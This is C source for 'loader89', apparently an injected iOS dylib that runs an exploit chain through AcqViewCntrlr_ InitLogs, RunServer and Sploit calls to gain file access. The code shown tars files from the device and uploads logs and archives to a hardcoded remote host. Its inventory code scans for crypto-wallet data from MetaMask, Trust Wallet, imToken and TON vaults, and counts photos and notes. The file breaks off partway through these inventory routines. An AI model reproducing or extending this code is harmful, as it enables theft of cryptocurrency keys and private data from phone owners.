/* loader89.c - 89yl 双链路加载器 v6.0 (onemain-noinit-clash)
 * exploit chain: AcqViewCntrlr_ RunServer + Sploit
 * MHA/MCM fallback chain: libuiopsersvc `_mcm_filza_run` -> virtual root
 * Both chains write a real tar archive and auto-upload it.
 * v6.0 fix A: core sink init (0x59fa28) is one-shot per process (atomic guard).
 * v6.0 fix B: direct exploit fallback prefers the GCD main queue (dlsym'd),
 *             pthread only as fallback; parent wait budget 60s @ 250ms.
 */
typedef unsigned long u64;
typedef long long i64;

extern void *dlopen(const char *, int);
extern void *dlsym(void *, const char *);
extern void *malloc(unsigned long);
extern void free(void *);
extern void *memcpy(void *, const void *, unsigned long);
extern unsigned long strlen(const char *);
extern int snprintf(char *, unsigned long, const char *, ...);
extern int open(const char *, int, ...);
extern int close(int);
extern long write(int, const void *, unsigned long);
extern long read(int, void *, unsigned long);
extern unsigned int sleep(unsigned int);
extern long time(void *);
extern int pthread_create(void *, const void *, void *(*)(void *), void *);
extern int pthread_detach(void *);
extern int pthread_join(void *, void **);
extern int sysctlbyname(const char *, void *, unsigned long *, void *, unsigned long);
extern char *getenv(const char *);
extern int strcmp(const char *, const char *);
extern int dup2(int, int);
extern int fflush(void *);
extern int atoi(const char *);
extern unsigned int _dyld_image_count(void);
extern const void *_dyld_get_image_header(unsigned int);
extern const char *_dyld_get_image_name(unsigned int);

#define RTLD_DEFAULT ((void *)-2)
#define O_RDONLY 0
#define O_WRONLY 1
#define O_CREAT 0x200
#define O_APPEND 8
#define O_TRUNC 0x400

#define LOADER89_DEFAULT_HOST "192.168.1.167"
#define LOADER89_DEFAULT_PORT 8080

#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <errno.h>
#include <string.h>

static void *(*p_dlsym)(void *, const char *);
static void *(*p_msgSend)();
static void *(*p_getClass)(const char *);
static void *(*p_sel)(const char *);
static void *(*p_nslog)();
static void *(*p_retain)(void *);
static void *(*p_release)(void *);
/* v5.8: exploit success state, written by child/worker,
 * read by parent for manifest + FINAL line. 0=idle, 1=running,
 * 2=success, 3=fail, 4=timeout */
static volatile int g_exploit_state = 0;
#define EXPLOIT_ST_IDLE    0
#define EXPLOIT_ST_RUN    1
#define EXPLOIT_ST_OK     2
#define EXPLOIT_ST_FAIL   3
#define EXPLOIT_ST_TIMEOUT 4
static int g_mha_leases = 0;
static char g_sts_statuspath[512];
static int g_logfd = -1;
/* v5.8 problem B fix: fallback thread reads this static struct,
 * the old stack-local copy was a dangling-pointer risk. */
/* v5.10 fix (audit): confirmed the direct-fallback worker passes only
 * this static global struct to the detached exploit thread; no new
 * stack-local struct is handed to any thread, so no dangling reference. */
static struct exploit_thread_args {
    void *acqCls;
    void *core;
} g_exploit_args;
/* v6.0 fix A: process-wide one-shot guard for the core sink init call
 * (core+0x59fa28). 0 = never attempted, 1 = some thread is inside the
 * init right now, 2 = completed. V59 hung 12s after "InitLogs before"
 * because the app's own init flow and the direct-fallback thread could
 * both reach 0x59fa28 and double-initialize the core logger
 * (__cxa_guard / mutex clash). With this guard 0x59fa28 runs at most
 * once per process, and any second caller only probes the vtable. */
static volatile int g_sink_init_guard = 0;
/* v6.0 fix B: GCD entry points resolved via dlsym (same pattern as the
 * objc pointers below) so we add no <dispatch/dispatch.h> include and
 * keep the injected-dylib compile environment unchanged. If resolution
 * fails we fall back to the plain pthread path with a warn line. */
static void *(*p_get_main_queue)(void);
static void (*p_dispatch_async_f)(void *, void *, void (*)(void *));
static char g_logpath[512];
static char g_host[128];
static int g_port = LOADER89_DEFAULT_PORT;

static void raw_log(const char *s) {
    if (g_logfd >= 0) { write(g_logfd, s, strlen(s)); write(g_logfd, "\n", 1); }
    if (p_nslog && p_getClass && p_msgSend && p_sel) {
        void *nsstring = p_getClass("NSString");
        if (nsstring) {
            void *s2 = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)s);
            if (s2) p_nslog(s2);
        }
    }
}

static void log_line(const char *level, const char *msg) {
    char ts[32], buf[1400];
    snprintf(ts, sizeof(ts), "%lld", (long long)time(0));
    snprintf(buf, sizeof(buf), "{\"ts\":%s,\"level\":\"%s\",\"msg\":\"%s\"}", ts, level, msg);
    raw_log(buf);
}

static void log_info(const char *msg) { log_line("info", msg); }
static void log_warn(const char *msg) { log_line("warn", msg); }
static void log_error(const char *msg) { log_line("error", msg); }

static void log_u64(const char *tag, u64 v) {
    char buf[180];
    snprintf(buf, sizeof(buf), "%s%llu", tag, (unsigned long long)v);
    log_info(buf);
}

static char *cat3(const char *a, const char *b, const char *c) {
    unsigned long n = strlen(a) + strlen(b) + strlen(c) + 1;
    char *p = (char *)malloc(n);
    unsigned long i = 0, j;
    for (j = 0; a[j]; j++) p[i++] = a[j];
    for (j = 0; b[j]; j++) p[i++] = b[j];
    for (j = 0; c[j]; j++) p[i++] = c[j];
    p[i] = 0;
    return p;
}

static void json_escape(char *dst, unsigned long dstn, const char *src) {
    unsigned long i = 0, o = 0;
    while (src[i] && o + 6 < dstn) {
        char c = src[i];
        if (c == '"' || c == '\\') { dst[o++] = '\\'; dst[o++] = c; }
        else if (c >= 0x20 && (unsigned char)c < 0x80) dst[o++] = c;
        else { dst[o++] = '?'; }
        i++;
    }
    dst[o] = 0;
}

static void sysctl_str(const char *name, char *out, unsigned long outn) {
    char buf[160];
    unsigned long n = sizeof(buf);
    if (sysctlbyname(name, buf, &n, 0, 0) == 0) {
        unsigned long i = 0;
        for (; i < outn - 1 && i < n && buf[i]; i++) out[i] = buf[i];
        out[i] = 0;
    } else out[0] = 0;
}

static int ios_major_version(void) {
    char buf[32];
    sysctl_str("kern.osproductversion", buf, sizeof(buf));
    int v = 0;
    for (int i = 0; buf[i] >= '0' && buf[i] <= '9'; i++) v = v * 10 + (buf[i] - '0');
    return v;
}

static char *objc_cstr(void *obj) {
    if (!obj) return 0;
    const char *s = (const char *)p_msgSend(obj, p_sel("UTF8String"));
    if (!s) return 0;
    unsigned long n = strlen(s);
    char *out = (char *)malloc(n + 1);
    unsigned long i;
    for (i = 0; i <= n; i++) out[i] = s[i];
    return out;
}

static char *info_string(const char *key) {
    void *bundle = p_msgSend(p_getClass("NSBundle"), p_sel("mainBundle"));
    if (!bundle) return 0;
    void *nsstring = p_getClass("NSString");
    void *k = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)key);
    void *obj = p_msgSend(bundle, p_sel("objectForInfoDictionaryKey:"), k);
    return objc_cstr(obj);
}

static long info_int(const char *key, long fallback) {
    void *bundle = p_msgSend(p_getClass("NSBundle"), p_sel("mainBundle"));
    if (!bundle) return fallback;
    void *nsstring = p_getClass("NSString");
    void *k = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), (char *)key);
    void *obj = p_msgSend(bundle, p_sel("objectForInfoDictionaryKey:"), k);
    if (!obj) return fallback;
    long v = (long)p_msgSend(obj, p_sel("intValue"));
    return v ? v : fallback;
}

static int path_exists(const char *path) {
    struct stat st;
    return path && path[0] && stat(path, &st) == 0;
}

static long dir_file_count(const char *path, int depth) {
    if (!path || !path[0]) return -1;
    DIR *dir = opendir(path);
    if (!dir) return -1;
    long n = 0;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir))) {
        const char *nm = e->d_name;
        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
        char *full = cat3(path, "/", nm);
        struct stat st;
        if (lstat(full, &st) == 0) {
            if ((st.st_mode & 0xF000) == 0x4000) {
                if (depth > 0) n += dir_file_count(full, depth - 1);
            } else n++;
        }
        free(full);
    }
    closedir(dir);
    return n;
}

static void log_root_top(const char *tag, const char *root, int max_entries) {
    if (!root || !root[0]) { log_info("root listing skipped (empty)"); return; }
    DIR *dir = opendir(root);
    if (!dir) { log_error("root listing FAIL"); return; }
    int shown = 0, files = 0, dirs = 0;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir))) {
        const char *nm = e->d_name;
        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
        char *full = cat3(root, "/", nm);
        struct stat st;
        int is_dir = lstat(full, &st) == 0 && ((st.st_mode & 0xF000) == 0x4000);
        if (is_dir) dirs++; else files++;
        if (shown < max_entries) {
            char line[520];
            snprintf(line, sizeof(line), "%s entry=%s type=%s", tag, nm, is_dir ? "dir" : "file");
            log_info(line);
            shown++;
        }
        free(full);
    }
    closedir(dir);
    char msg[220];
    snprintf(msg, sizeof(msg), "%s totals dirs=%d files=%d shown=%d", tag, dirs, files, shown);
    log_info(msg);
}

static char *objc_property_string(void *obj, const char *selname) {
    if (!obj) return 0;
    void *v = p_msgSend(obj, p_sel(selname));
    return objc_cstr(v);
}

static char *device_string(const char *selector) {
    void *dev = p_msgSend(p_getClass("UIDevice"), p_sel("currentDevice"));
    if (!dev) return 0;
    if (strcmp(selector, "identifierForVendor") == 0) {
        /* v5.2 fix: UIDevice.identifierForVendor -> NSUUID.UUIDString.
           Calling UUIDString directly on UIDevice raises
           NSInvalidArgumentException / SIGABRT. */
        void *uuid = p_msgSend(dev, p_sel("identifierForVendor"));
        if (!uuid) return 0;
        return objc_cstr(p_msgSend(uuid, p_sel("UUIDString")));
    }
    return objc_cstr(p_msgSend(dev, p_sel(selector)));
}

static void read_runtime_config(void) {
    char *h = info_string("Loader89Host");
    if (h && h[0]) {
        unsigned long i = 0;
        for (; i < sizeof(g_host) - 1 && h[i]; i++) g_host[i] = h[i];
        g_host[i] = 0;
    } else {
        unsigned long i = 0;
        for (; i < sizeof(g_host) - 1 && LOADER89_DEFAULT_HOST[i]; i++) g_host[i] = LOADER89_DEFAULT_HOST[i];
        g_host[i] = 0;
    }
    if (h) free(h);
    g_port = (int)info_int("Loader89Port", LOADER89_DEFAULT_PORT);
    if (g_port <= 0 || g_port > 65535) g_port = LOADER89_DEFAULT_PORT;
}

static void init_log(void) {
    char *home = getenv("HOME");
    char *p = cat3(home ? home : "/var/mobile", "/Documents/loader89.log", "");
    unsigned long i = 0;
    for (; i < sizeof(g_logpath) - 1 && p[i]; i++) g_logpath[i] = p[i];
    g_logpath[i] = 0;
    g_logfd = open(g_logpath, O_WRONLY | O_CREAT | O_APPEND, 0644);
    free(p);
}

static void post_log_now(void) {
    if (!g_host[0] || g_logfd < 0) return;
    void *nsstring = p_getClass("NSString");
    char url[256];
    snprintf(url, sizeof(url), "http://%s:%d/log", g_host, g_port);
    void *urlStr = p_msgSend(nsstring, p_sel("stringWithUTF8String:"), url);
    void *nsurl = p_msgSend(p_getClass("NSURL"), p_sel("URLWithString:"), urlStr);
    if (!nsurl) return;
    void *req = p_msgSend(p_getClass("NSMutableURLRequest"), p_sel("requestWithURL:"), nsurl);
    if (!req) return;
    p_msgSend(req, p_sel("setHTTPMethod:"), p_msgSend(nsstring, p_sel("stringWithUTF8String:"), "POST"));
    void *data = p_msgSend(p_getClass("NSData"), p_sel("dataWithContentsOfFile:"), p_msgSend(nsstring, p_sel("stringWithUTF8String:"), g_logpath));
    if (!data) return;
    p_msgSend(req, p_sel("setHTTPBody:"), data);
    void *resp = 0, *err = 0;
    void *ret = p_msgSend(p_getClass("NSURLConnection"), p_sel("sendSynchronousRequest:returningResponse:error:"), req, &resp, &err);
    log_info(ret ? "log upload OK" : "log upload FAIL");
}

/* ---------- tar writing ---------- */
static int write_all(int fd, const void *buf, unsigned long n) {
    const unsigned char *p = (const unsigned char *)buf;
    while (n) {
        long r = write(fd, p, n);
        if (r <= 0) return -1;
        p += r; n -= (unsigned long)r;
    }
    return 0;
}

static void put_octal(char *dst, int n, unsigned long v) {
    int i = n - 1;
    dst[i--] = 0;
    while (i >= 0) { dst[i--] = (char)('0' + (v % 8)); v /= 8; }
}

static int tar_header(int fd, const char *name, unsigned long size, char type, long mtime) {
    unsigned char h[512];
    int i;
    for (i = 0; i < 512; i++) h[i] = 0;
    for (i = 0; name[i] && i < 100; i++) h[i] = (unsigned char)name[i];
    put_octal((char *)h + 100, 8, 0644);
    put_octal((char *)h + 108, 8, 0);
    put_octal((char *)h + 116, 8, 0);
    put_octal((char *)h + 124, 12, size);
    put_octal((char *)h + 136, 12, (unsigned long)mtime);
    for (i = 148; i < 156; i++) h[i] = ' ';
    h[156] = (unsigned char)type;
    h[257] = 'u'; h[258] = 's'; h[259] = 't'; h[260] = 'a'; h[261] = 'r';
    h[262] = 0; h[263] = '0'; h[264] = '0';
    unsigned long sum = 0;
    for (i = 0; i < 512; i++) sum += h[i];
    put_octal((char *)h + 148, 8, sum);
    h[155] = ' ';
    return write_all(fd, h, 512);
}

static int tar_long_name(int fd, const char *name) {
    unsigned long n = strlen(name) + 1;
    if (tar_header(fd, "././@LongLink", n, 'L', (long)time(0)) < 0) return -1;
    if (write_all(fd, name, n) < 0) return -1;
    unsigned long pad = (512 - (n % 512)) % 512;
    char zero[512] = {0};
    if (pad && write_all(fd, zero, pad) < 0) return -1;
    return 0;
}

static int tar_copy_file(int fd, const char *path, const char *name, long size) {
    int in = open(path, O_RDONLY);
    if (in < 0) return -1;
    if (name[0] && strlen(name) > 99) {
        if (tar_long_name(fd, name) < 0) { close(in); return -1; }
    }
    if (tar_header(fd, name, (unsigned long)size, '0', (long)time(0)) < 0) { close(in); return -1; }
    char buf[8192];
    long left = size;
    while (left > 0) {
        long r = read(in, buf, left < (long)sizeof(buf) ? (unsigned long)left : sizeof(buf));
        if (r <= 0) break;
        if (write_all(fd, buf, (unsigned long)r) < 0) { close(in); return -1; }
        left -= r;
    }
    close(in);
    if (left > 0) size -= left;
    unsigned long written = (unsigned long)size;
    unsigned long pad = (512 - (written % 512)) % 512;
    char zero[512] = {0};
    if (pad && write_all(fd, zero, pad) < 0) return -1;
    return 0;
}

static int is_dirlike(const char *path, struct stat *st) {
    if (lstat(path, st) != 0) return 0;
    if ((st->st_mode & 0xF000) == 0x4000) return 1;
    if ((st->st_mode & 0xF000) == 0xA000) {
        struct stat ts;
        if (stat(path, &ts) == 0 && (ts.st_mode & 0xF000) == 0x4000) { *st = ts; return 1; }
    }
    return 0;
}

static int tar_add_tree(const char *base, const char *rel, int tarfd, char *out, unsigned long *used,
                        unsigned long outn, int max_files, int depth, unsigned long *budget) {
    if (depth > 8 || max_files <= 0 || *used + 1 >= outn || *budget < 1024) return 0;
    char *full = rel[0] ? cat3(base, "/", rel) : cat3(base, "", "");
    DIR *dir = opendir(full);
    free(full);
    if (!dir) return 0;
    int count = 0;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir)) && count < max_files) {
        const char *nm = e->d_name;
        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
        char *r2 = rel[0] ? cat3(rel, "/", nm) : (char *)nm;
        char *path = cat3(base, "/", r2);
        struct stat st;
        if (is_dirlike(path, &st)) {
            count += tar_add_tree(base, r2, tarfd, out, used, outn, max_files - count, depth + 1, budget);
        } else {
            struct stat fs;
            if (lstat(path, &fs) == 0 && (fs.st_mode & 0xF000) != 0x4000 && fs.st_size > 0 && fs.st_size <= 8 * 1024 * 1024) {
                if ((unsigned long)fs.st_size + 1024 <= *budget && tar_copy_file(tarfd, path, r2, (long)fs.st_size) == 0) {
                    char jp[620], esc[400];
                    json_escape(esc, sizeof(esc), r2);
                    int n = snprintf(jp, sizeof(jp), "{\"path\":\"%s\",\"size\":%lld}", esc, (long long)fs.st_size);
                    if (n > 0 && *used + (unsigned long)n + 2 < outn) {
                        if (*used > 0) out[(*used)++] = ',';
                        for (int k = 0; k < n; k++) out[(*used)++] = jp[k];
                    }
                    *budget -= (unsigned long)fs.st_size + 1024;
                    count++;
                }
            }
        }
        if (r2 != (char *)nm) free(r2);
        free(path);
    }
    closedir(dir);
    if (*used < outn) out[*used] = 0;
    return count;
}

static void finish_tar(int fd) {
    char zero[1024] = {0};
    write_all(fd, zero, 1024);
    close(fd);
}

static int contains_ci(const char *hay, const char *needle) {
    if (!hay || !needle) return 0;
    for (; *hay; hay++) {
        unsigned long k = 0;
        while (needle[k] && hay[k] && hay[k] == needle[k]) k++;
        if (!needle[k]) return 1;
    }
    return 0;
}

/* v4.3: dlopen() handle is opaque; never use it as image base.
 * Resolve real load address of libwebuiopsercore from dyld image list. */
static int resolve_core_base(void *core, unsigned char **out_base) {
    (void)core;
    unsigned int n = _dyld_image_count();
    for (unsigned int i = 0; i < n; i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name || !contains_ci(name, "libwebuiopsercore")) continue;
        const void *hdr = _dyld_get_image_header(i);
        if (!hdr) continue;
        *out_base = (unsigned char *)hdr;
        char msg[300];
        snprintf(msg, sizeof(msg), "core base resolved idx=%u base=%p path=%s", i, (void *)*out_base, name);
        log_info(msg);
        return 1;
    }
    log_error("core base NOT FOUND in dyld image list");
    return 0;
}

static void repair_core_log_sink(void *core) {
    if (!core) return;
    /* v6.0 fix A: one-shot, process-wide. If another thread (the app's own
     * init flow after dlopen(core)) already owns or finished the 0x59fa28
     * init, NEVER call it again - concurrent double-init of the core logger
     * is the top suspect for the V59 12s hang. We only probe the vtable. */
    if (!__sync_bool_compare_and_swap(&g_sink_init_guard, 0, 1)) {
        unsigned char *b = 0;
        if (resolve_core_base(core, &b) && *(void **)(b + 0x6ca1b8))
            log_info("core sink vtable OK (init done elsewhere; v6.0 fix A)");
        else
            log_warn("core sink init owned by another thread; skip 0x59fa28 (v6.0 fix A)");
        return;
    }
    unsigned char *base = 0;
    if (!resolve_core_base(core, &base)) {
        log_info("core sink repair SKIPPED (no base); continue");
        g_sink_init_guard = 2;
        return;
    }
    void **sink = (void **)(base + 0x6ca1b8);
    void **slot = (void **)(base + 0x6b98c0);
    char msg[220];
    snprintf(msg, sizeof(msg), "core sink before vtable=%p slot=%p", *sink, (void *)*slot);
    log_info(msg);
    if (*sink) {
        /* v6.0 fix A rule: vtable non-zero -> never call 0x59fa28. */
        log_info("core sink vtable OK");
        g_sink_init_guard = 2;
        return;
    }
    void (*init_sink)(void) = (void (*)(void))(base + 0x59fa28);
    log_info("core sink vtable ZERO; running init 0x59fa28 (once per process; v6.0 fix A)");
    init_sink();
    g_sink_init_guard = 2;
    snprintf(msg, sizeof(msg), "core sink after vtable=%p slot=%p", *sink, (void *)*slot);
    log_info(msg);
}

/* v5.8 problem A fix: separate "base resolved" from "raw flag read".
 * return 0 = hard failure (no core handle / no raw==0); never treat
 * a resolver error as exploit success. Detailed state goes to *out_raw /
 * *out_resolved so callers and the status file can distinguish them. */
static int exploit_core_ok(void *core, int *out_raw, int *out_resolved) {
    if (out_raw) *out_raw = -1;
    if (out_resolved) *out_resolved = 0;
    /* dlopen() returns an opaque handle, not a Mach-O image base.
       Reuse the v4.3/v4.4 resolver here as well; reading directly from
       the handle caused SIGSEGV in the child exploit chain. */
    if (!core) return 0;
    unsigned char *base = 0;
    if (!resolve_core_base(core, &base)) {
        log_warn("core NOT FOUND; not counted as success");
        return 0;
    }
    if (out_resolved) *out_resolved = 1;
    unsigned char *flag = base + 0x6b96d8;
    int raw = *flag;
    if (out_raw) *out_raw = raw;
    int ok = (raw == 0);
    char msg[300];
    snprintf(msg, sizeof(msg), "core base=%p flag addr=%p raw=%d ok=%d", (void *)base, (void *)flag, raw, ok);
    log_info(msg);
    return ok;
}

/* v5.6: original main binary calls CLASS methods, not instance methods.
 * Disassembly shows: objc_getClass(AcqViewCntrlr_) -> Sploit -> RunServer.
 * No alloc/init and no InitLogs are called by the original host. */
static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root);

struct exploit_status {
    int sploit_done;
    int runserver_done;
    int core_base_resolved;
    int raw_flag;      /* -1 = unreadable, otherwise raw value at flag addr */
    int succeeded;     /* 1 only when core_base_resolved && raw_flag == 0 */
    char phase[16];    /* v6.0: "initlogs" / "runserver" / "sploit" / "done" */
    long phase_ts;     /* v6.0: unix ts when the current phase was entered */
};

static struct exploit_status g_exploit_sts = {0, 0, 0, -1, 0, "", 0};

/* v5.8 problem C fix: child writes a status file; parent reads it
 * instead of guessing success from the exit code alone. */
static void write_child_status(void) {
    if (!g_sts_statuspath[0]) return;
    char buf[512];
    char ephase[32];
    json_escape(ephase, sizeof(ephase), g_exploit_sts.phase);
    int n = snprintf(buf, sizeof(buf),
        "{\"phase\":\"%s\",\"phase_ts\":%ld,"
        "\"sploit_done\":%d,\"runserver_done\":%d,\"core_base_resolved\":%d,"
        "\"raw_flag\":%d,\"success\":%d}",
        ephase, g_exploit_sts.phase_ts,
        g_exploit_sts.sploit_done, g_exploit_sts.runserver_done,
        g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag, g_exploit_sts.succeeded);
    if (n <= 0) return;
    int fd = open(g_sts_statuspath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return;
    unsigned long off = 0;
    while (off < (unsigned long)n) {
        long r = write(fd, buf + off, (unsigned long)n - off);
        if (r <= 0) break;
        off += (long)r;
    }
    close(fd);
}

/* v6.0: enter a new exploit phase, stamp it, and persist immediately.
 * Used by BOTH paths (fork child and direct in-process fallback) because
 * both run exploit_class_main, so the status file keeps one unified format. */
static void set_exploit_phase(const char *phase) {
    snprintf(g_exploit_sts.phase, sizeof(g_exploit_sts.phase), "%s", phase);
    g_exploit_sts.phase_ts = (long)time(0);
    write_child_status();
}

/* v6.0: lightweight phase-only read for the 250ms poller; does not touch
 * g_exploit_sts booleans and does not log, so it cannot spam or clobber. */
static int read_status_phase(char *out, unsigned long outn) {
    out[0] = 0;
    if (!g_sts_statuspath[0]) return 0;
    int fd = open(g_sts_statuspath, O_RDONLY);
    if (fd < 0) return 0;
    char buf[512];
    long n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = 0;
    const char *v = strstr(buf, "\"phase\":\"");
    if (!v) return 0;
    v += 9;
    unsigned long i = 0;
    while (v[i] && v[i] != '"' && i + 1 < outn) { out[i] = v[i]; i++; }
    out[i] = 0;
    return out[0] != 0;
}

/* v5.8: parent side — parse the child's status JSON. We only need
 * booleans; simple "key":N matching is enough and stays dependency-free. */
static int read_child_status(void) {
    if (!g_sts_statuspath[0]) return 0;
    g_exploit_sts.succeeded = 0;
    g_exploit_sts.core_base_resolved = 0;
    g_exploit_sts.raw_flag = -1;
    g_exploit_sts.sploit_done = 0;
    g_exploit_sts.runserver_done = 0;
    g_exploit_sts.phase[0] = 0;
    g_exploit_sts.phase_ts = 0;
    int fd = open(g_sts_statuspath, O_RDONLY);
    if (fd < 0) return 0;
    char buf[512];
    long n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = 0;
    const char *v;
    /* v6.0: parse the phase field too, so the parent-side g_exploit_sts
     * mirrors the writer's format ("phase":"initlogs"/"runserver"/
     * "sploit"/"done" + phase_ts). Older files without phase keep the
     * previous behaviour (empty phase), i.e. format stays compatible. */
    if ((v = strstr(buf, "\"phase\":\""))) {
        v += 9;
        unsigned long k = 0;
        while (v[k] && v[k] != '"' && k + 1 < sizeof(g_exploit_sts.phase)) { g_exploit_sts.phase[k] = v[k]; k++; }
        g_exploit_sts.phase[k] = 0;
    }
    if ((v = strstr(buf, "\"phase_ts\":"))) g_exploit_sts.phase_ts = (long)atoi(v + 11);
    if ((v = strstr(buf, "\"core_base_resolved\":"))) g_exploit_sts.core_base_resolved = atoi(v + 20);
    if ((v = strstr(buf, "\"raw_flag\":"))) g_exploit_sts.raw_flag = atoi(v + 11);
    if ((v = strstr(buf, "\"sploit_done\":"))) g_exploit_sts.sploit_done = atoi(v + 14);
    if ((v = strstr(buf, "\"runserver_done\":"))) g_exploit_sts.runserver_done = atoi(v + 17);
    if ((v = strstr(buf, "\"success\":"))) g_exploit_sts.succeeded = atoi(v + 10);
    /* Problem A guard one more time: never claim success unless the base
     * was resolved AND raw == 0, no matter what the file says. */
    if (g_exploit_sts.succeeded && !(g_exploit_sts.core_base_resolved && g_exploit_sts.raw_flag == 0))
        g_exploit_sts.succeeded = 0;
    char msg[220];
    snprintf(msg, sizeof(msg), "child status file: sploit=%d runserver=%d resolved=%d raw=%d success=%d",
             g_exploit_sts.sploit_done, g_exploit_sts.runserver_done,
             g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag, g_exploit_sts.succeeded);
    log_info(msg);
    return g_exploit_sts.succeeded;
}

static int exploit_class_main(void *acqCls, void *core) {
    if (!acqCls) return 2;
    /* v5.9 fix: ObjC metadata probe (v59_meta_probe.py) proved all 36 methods
     * of AcqViewCntrlr_ are INSTANCE methods and the metaclass method list is
     * empty (baseMethods=0). Calling +[AcqViewCntrlr_ Sploit] crashed with
     * NSInvalidArgumentException on device. Correct chain per IMP order:
     * alloc/init -> InitLogs(0x42a0) -> RunServer(0x4688) -> Sploit(0x4694).
     * All three take no arguments (v16@0:8). */
    void *inst = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
    if (!inst) { log_error("AcqViewCntrlr_ alloc/init returned nil"); return 3; }
    set_exploit_phase("initlogs");   /* v6.0: phase progress + ts to status file */
    log_info("InitLogs before");
    p_msgSend(inst, p_sel("InitLogs"));
    log_info("InitLogs after");
    set_exploit_phase("runserver");
    log_info("RunServer before");
    p_msgSend(inst, p_sel("RunServer"));
    g_exploit_sts.runserver_done = 1;
    g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
    log_info("RunServer after");
    set_exploit_phase("sploit");
    log_info("Sploit before");
    p_msgSend(inst, p_sel("Sploit"));
    log_info("Sploit after");
    g_exploit_sts.sploit_done = 1;
    g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
    set_exploit_phase("done");
    int ok = g_exploit_sts.succeeded;
    char msg[220];
    snprintf(msg, sizeof(msg), "exploit class-chain result succeeded=%d resolved=%d raw=%d", ok,
             g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag);
    log_info(msg);
    if (ok) {
        upload_manifest(1, 0, "exploit-class", 0);
        return 0;
    }
    return 6;
}

static void *exploit_thread_worker(void *arg) {
    struct exploit_thread_args *a = (struct exploit_thread_args *)arg;
    /* v6.0 fix A: ensure the core sink exists before InitLogs, but never
     * double-init - if the vtable is already non-zero (or another thread
     * owns the init) the guard inside skips 0x59fa28 entirely. */
    repair_core_log_sink(a->core);
    int rc = exploit_class_main(a->acqCls, a->core);
    write_child_status();
    g_exploit_state = (rc == 0) ? EXPLOIT_ST_OK : EXPLOIT_ST_FAIL;
    return (void *)(long)rc;
}

/* ---------- v5.6 collection inventories ---------- */
static void extract_bundle_like(const char *data, unsigned long n, char *out, unsigned long outn) {
    out[0] = 0;
    unsigned long best_len = 0, best_at = 0;
    for (unsigned long i = 0; i < n; i++) {
        if (!((data[i] >= 'a' && data[i] <= 'z') || (data[i] >= 'A' && data[i] <= 'Z') ||
              (data[i] >= '0' && data[i] <= '9') || data[i] == '.' || data[i] == '-' || data[i] == '_')) continue;
        unsigned long j = i;
        while (j < n && ((data[j] >= 'a' && data[j] <= 'z') || (data[j] >= 'A' && data[j] <= 'Z') ||
                         (data[j] >= '0' && data[j] <= '9') || data[j] == '.' || data[j] == '-' || data[j] == '_')) j++;
        unsigned long len = j - i;
        if (len >= 6 && len < 160 && memchr(data + i, '.', len)) {
            int score = 0;
            if (len > best_len) score = 1;
            if ((len >= 9 && memcmp(data + i, "com.", 4) == 0) ||
                (len >= 11 && memcmp(data + i, "im.token.app", 11) == 0) ||
                (len >= 16 && memcmp(data + i, "io.metamask.MetaMask", 16) == 0) ||
                (len >= 17 && memcmp(data + i, "com.sixdays.trust", 17) == 0)) score = 2;
            if (score >= (best_len ? 1 : 0)) { best_len = len; best_at = i; }
        }
        i = j;
    }
    if (best_len && best_len < outn) {
        unsigned long k = 0;
        for (; k < best_len && k + 1 < outn; k++) out[k] = data[best_at + k];
        out[k] = 0;
    }
}

static void read_bundle_identity(const char *dir, char *out, unsigned long outn) {
    out[0] = 0;
    char *p = cat3(dir, "/.com.apple.mobile_container_manager.metadata.plist", "");
    int fd = open(p, O_RDONLY);
    free(p);
    if (fd < 0) return;
    char buf[8192];
    long n = read(fd, buf, sizeof(buf));
    close(fd);
    if (n > 0) extract_bundle_like(buf, (unsigned long)n, out, outn);
}

static long count_direct_dirs(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) return 0;
    long n = 0;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir))) {
        if (e->d_name[0] == '.' && (e->d_name[1] == 0 || (e->d_name[1] == '.' && e->d_name[2] == 0))) continue;
        char *full = cat3(path, "/", e->d_name);
        struct stat st;
        if (lstat(full, &st) == 0 && (st.st_mode & 0xF000) == 0x4000) n++;
        free(full);
    }
    closedir(dir);
    return n;
}

struct Inventory {
    char *out;
    unsigned long cap;
    unsigned long *used;
    long files;
    long walletsv2;
    long rct_storage;
    long meta_vault;
    long trust_keystore;
    long trust_sekek;
    long tp_sqlite;
    long tp_key;
    long ton_vault;
    long photos;
    long notes;
};

static void inv_add_raw(struct Inventory *iv, const char *text) {
    unsigned long n = strlen(text);
    if (*iv->used + n + 2 < iv->cap) {
        if (*iv->used) iv->out[(*iv->used)++] = ',';
        for (unsigned long i = 0; i < n; i++) iv->out[(*iv->used)++] = text[i];
        iv->out[*iv->used] = 0;
    }
}

static void inv_add_hit(struct Inventory *iv, const char *rel, long size, const char *kind) {
    char esc[900], epath[600];
    json_escape(epath, sizeof(epath), rel);
    int n = snprintf(esc, sizeof(esc), "{\"path\":\"%s\",\"size\":%ld,\"kind\":\"%s\"}", epath, size, kind);
    if (n > 0) inv_add_raw(iv, esc);
}

